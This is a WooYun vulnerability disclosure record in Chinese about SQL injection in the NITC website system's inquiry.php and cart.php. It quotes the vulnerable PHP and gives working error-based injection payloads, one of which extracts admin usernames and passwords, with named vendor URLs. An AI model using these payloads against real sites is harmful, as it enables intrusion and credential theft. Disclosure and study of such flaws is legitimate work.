{"id": 43908, "wybug_id": "wooyun-2015-081305", "wybug_title": "NITC企业智能营销网站系统通杀注入", "wybug_corp": "NITC", "wybug_author": "郭斯特", "wybug_date": "2015-01-12 14:43", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-12：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： rt~ 详细说明：  NITC是国内第一家提供永久免费“效益型网站系统”的互联网企业。2008年投入研发NITC网站系统，2009年8月推出第一个产品———“NITC免费效益型网站系统V1.0”，数年来，因为系统一直免费，耗资近500万元。NITC产品深得用户喜爱，特别是2011年7月推出的“（定海神真）免费效益型网站系统V3.2”，用户下载量巨增。NITC系统其核心优势在于“营销功能强，用户体验好”，后台管理完全按照SEM网络营销规则设定，前端页面（主题模板）全部经W3C国际网页标准认证。简单易用，界面精美，是中小企业网站营销的最佳选择，不需要专业的技术就能轻易上手，并且做出网络营销效果非常好的网站。2013年12月NITC再度推出“企业智能营销系统V4.0”，是目前最高级版本。该产品是在V3.2的基础上细化了原来优势功能，并且增加了手机网站、在线购物、会员管理、产品评论、在线分享等功能。这标志着NITC产品进入了一个新阶段，完美的实现了“企业网站+SEO优化+购物商城+手机网站”四合一的功能。它就象变形金刚一样，应用不同需求时表现出不同的价值。漏洞文件：inquiry.php 和 cart.php （不同文件 但是存在一样的问题）参数product[] 木有单引号保护$select = $_POST['product'];\t\t\t\t\t\t\t\t$i = 0;\t\t\t\t\t\t\t\tfor ( ;\t$i < count( $select );\t++$i\t)\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\tif ( isset( $select[$i] ) )\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$product = $db->getRow( \"select product.product_id,product.model,product.small_image,product_desc.name,product.price,product.weight from \".$site->table( \"product\" ).\" as product left join \".$site->table( \"product_desc\" ).\" as product_desc on product.product_id=product_desc.product_id where product.product_id=\".$select[$i].\" and product_desc.language_id=\".$language['language_id'] );\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif ( $product )\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t{\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$cart->add_item( SESS_ID, $select[$i], 1, $product['model'], $product['price'], $product['weight'], 1 );\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t}post product 数组进来for ( ;\t$i < count( $select );\t++$i\t)[]中间没东西取0select[0]就是数组的value导致注入官方四个站点均存在该漏洞exp：product[]=1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,version(),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)#   漏洞证明：  http://test.nitc.cc/inquiry.phpproduct[]=1 and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,lhf_user.user_name,0x27,lhf_user.password,0x27,0x7e) from lhf_user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) #\n\n\n\nhttp://nitc.cc/inquiry.php\n\nhttp://demo.cnnitc.com/inquiry.php\n\nhttp://demo.nitc.cc/inquiry.php\n\n   修复方案：  过滤   版权声明：转载请注明来源 郭斯特@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}